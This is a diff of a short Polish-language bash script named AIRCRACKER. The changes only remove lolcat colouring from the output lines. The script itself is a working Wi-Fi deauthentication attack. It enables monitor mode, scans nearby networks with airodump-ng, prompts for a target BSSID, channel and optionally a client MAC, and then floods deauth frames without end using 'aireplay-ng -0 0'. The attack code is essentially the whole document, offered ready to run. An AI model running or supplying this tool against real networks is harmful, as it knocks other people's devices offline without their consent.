@@ -1,5 +1,5 @@
 #! /bin/bash
-figlet "AIRCRACKER" | lolcat
+figlet "AIRCRACKER" 
 ifconfig
 read -r -p "Wprowadź interfejs sieciowy nasłuchu - " WLAN
 sudo airmon-ng start $WLAN
@@ -12,40 +12,40 @@ do
  
  case $input in
      [1][eE][sS]|[1])
-  echo "Startuje skrypt... " | lolcat
+  echo "Startuje skrypt... " 
   sleep 1.5
   clear
-  echo "W celu przerwania scanu naciśnij CTRL+C" | lolcat
+  echo "W celu przerwania scanu naciśnij CTRL+C" 
   sudo airodump-ng wlan0mon
   read -r -p "Wprowadź BSSID sieci - " BSSID
   read -r -p "Wprowadź BSSID kanał - " CH
   clear
-  echo "W celu przerwania scanu naciśnij CTRL+C" | lolcat
+  echo "W celu przerwania scanu naciśnij CTRL+C" 
   sudo airodump-ng -d $BSSID -c $CH wlan0mon
   read -r -p "Wprowadź MAC urządzenia - " MAC
   clear
   sudo aireplay-ng -0 0 -a $BSSID -c $MAC wlan0mon
-  echo "Dziękuje za skorzystanie ze skryptu !" | lolcat
+  echo "Dziękuje za skorzystanie ze skryptu !" 
  break
  ;;
      [2][oO]|[2])
-  echo "Startuje skrypt... " | lolcat
+  echo "Startuje skrypt... " 
   sleep 1.5
   clear
-  echo "W celu przerwania scanu naciśnij CTRL+C" | lolcat
+  echo "W celu przerwania scanu naciśnij CTRL+C" 
   sudo airodump-ng wlan0mon
   read -r -p "Wprowadź BSSID sieci - " BSSID
   read -r -p "Wprowadź BSSID kanał - " CH
   clear
-  echo "W celu przerwania scanu naciśnij CTRL+C" | lolcat
+  echo "W celu przerwania scanu naciśnij CTRL+C" 
   sudo airodump-ng -d $BSSID -c $CH wlan0mon
   clear
   sudo aireplay-ng -0 0 -a $BSSID wlan0mon
-  echo "Dziękuje za skorzystanie ze skryptu !" | lolcat
+  echo "Dziękuje za skorzystanie ze skryptu !" 
  break
  ;;
      *)
- echo "Nieprawidłowa komenda" | lolcat 
+ echo "Nieprawidłowa komenda" 
  ;;
  esac
 done
